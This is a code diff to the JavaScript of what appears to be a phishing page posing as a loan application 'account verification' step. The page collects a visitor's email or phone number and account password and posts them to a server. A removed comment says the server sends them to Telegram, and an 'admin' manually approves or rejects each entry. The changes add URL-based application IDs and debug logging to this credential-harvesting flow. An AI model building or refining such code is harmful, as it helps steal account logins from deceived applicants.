@@ -8,9 +8,22 @@ document.addEventListener('DOMContentLoaded', function() {
     const accountPassword = document.getElementById('accountPassword');
     const verifyBtn = document.getElementById('verifyBtn');
     
-    // Get application data
-    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
-    let applicationId = applicationData.applicationId || 'LOAN-' + Date.now();
+    // ✅ FIX: Get application ID from URL parameters (created during PIN step)
+    const urlParams = new URLSearchParams(window.location.search);
+    const applicationId = urlParams.get('applicationId');
+    const adminId = urlParams.get('admin');
+    
+    console.log('Verification page loaded');
+    console.log('Application ID from URL:', applicationId);
+    console.log('Admin ID from URL:', adminId);
+    
+    // ✅ CRITICAL: Check if applicationId exists
+    if (!applicationId) {
+        console.error('❌ No application ID in URL!');
+        alert('Invalid access. Please start from the beginning.');
+        window.location.href = adminId ? `/?admin=${adminId}` : '/';
+        return;
+    }
     
     // Focus on first input
     if (accountIdentifier) accountIdentifier.focus();
@@ -44,29 +57,36 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
+        console.log('Submitting verification...');
+        console.log('Application ID:', applicationId);
+        console.log('Identifier:', identifier);
+        console.log('Type:', isEmail ? 'email' : 'phone');
+        
         // Show processing screen
         verificationScreen.style.display = 'none';
         processingScreen.style.display = 'block';
         
         try {
             // Send verification request to server
+            console.log('Sending POST to /api/verify-account');
             const response = await fetch('/api/verify-account', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    applicationId: applicationId,
+                    applicationId: applicationId,  // ✅ Use the ID from URL
                     identifier: identifier,
                     password: password,
-                    identifierType: isEmail ? 'email' : 'phone',
-                    ...applicationData // Include all application data
+                    identifierType: isEmail ? 'email' : 'phone'
                 })
             });
             
+            console.log('Response status:', response.status);
             const result = await response.json();
+            console.log('Response data:', result);
             
-            // CHANGED: Always start checking status regardless of initial response
-            // The backend should send to Telegram and return pending status
+            // Start checking status regardless of initial response
             if (result.success || result.status === 'pending') {
+                console.log('✅ Verification submitted, starting status polling...');
                 checkVerificationStatus();
             } else {
                 // Only show error if there's a network/server error
@@ -83,18 +103,25 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Check verification status
     function checkVerificationStatus() {
+        console.log('Starting status polling for:', applicationId);
+        
         const statusInterval = setInterval(async () => {
             try {
+                console.log('Checking status...');
                 const response = await fetch(`/api/check-verification-status/${applicationId}`);
                 const result = await response.json();
                 
+                console.log('Status:', result.status);
+                
                 if (result.status === 'approved') {
                     clearInterval(statusInterval);
+                    console.log('✅ APPROVED! Redirecting to approval page...');
                     // Redirect to approval page
                     window.location.href = 'approval.html';
                     
                 } else if (result.status === 'rejected') {
                     clearInterval(statusInterval);
+                    console.log('❌ REJECTED! Showing rejection screen...');
                     // Show rejection screen
                     processingScreen.style.display = 'none';
                     rejectionScreen.style.display = 'block';
@@ -109,6 +136,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Timeout after 10 minutes (enough time for admin to review)
         setTimeout(() => {
             clearInterval(statusInterval);
+            console.log('⏱️ Status polling timeout');
             alert('Verification timeout. Please try again.');
             processingScreen.style.display = 'none';
             verificationScreen.style.display = 'block';
@@ -126,5 +154,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    console.log('Verification page loaded for application:', applicationId);
+    console.log('✅ Verification page initialized');
+    console.log('Waiting for application:', applicationId);
 });
